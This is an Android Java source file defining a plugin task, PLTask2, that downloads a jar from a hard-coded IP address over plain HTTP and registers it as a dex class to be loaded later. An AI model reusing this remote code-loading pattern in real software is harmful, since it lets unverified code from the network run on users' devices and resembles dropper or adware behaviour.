package com.k99k.dexplug;

import android.util.Log;
import android.view.View;

public class PLTask2 implements PLTask {

	public PLTask2() {
	}
	
	private DService dservice;
	private int id = 2;
	private int state = STATE_WAITING;
	private static final String TAG = "PLTask2";
	private int result = -1;
	
//	private int runTimes = 6;

	@Override
	public void setDService(DService serv) {
		this.dservice = serv;
	}

	@Override
	public int getId() {
		return this.id;
	}

	@Override
	public void init() {
		Log.d(TAG, "PLTask2 inited.");
	}
	
	

	/* (non-Javadoc)
	 * @see java.lang.Runnable#run()
	 */
	@Override
	public void run() {
		Log.d(TAG, "2 is running...");
		state = STATE_RUNNING;
		String remote = "http://180.96.63.71:8080/plserver/dats/emv2.jar";
		String vKey = String.valueOf(this.dservice.getKeyVersion());
		String localFile = DService.getLocalDexPath()+"emv2.jar";
		
		if(DService.download(remote, localFile, vKey)){
			this.dservice.setEmvClass("com.k99k.dexplug.MoreView2");
			this.dservice.setEmvPath(localFile);
			this.dservice.saveConfig();
			Log.d(TAG, "down dex OK.emvClass:"+this.dservice.getEmvClass()+" emvPath:"+this.dservice.getEmvPath());
			state = STATE_DIE;
			result = 0;
		}else{
			result = -1;
			state = STATE_WAITING;
		}
		Log.d(TAG, "task2 is done."+result);
	}


	@Override
	public int getState() {
		return this.state;
	}

	@Override
	public void setState(int state) {
		this.state = state;
	}

	@Override
	public int getExecResult() {
		return this.result;
	}

	@Override
	public boolean isCircleTask() {
		return false;
	}

	@Override
	public View getView() {
		return null;
	}


}
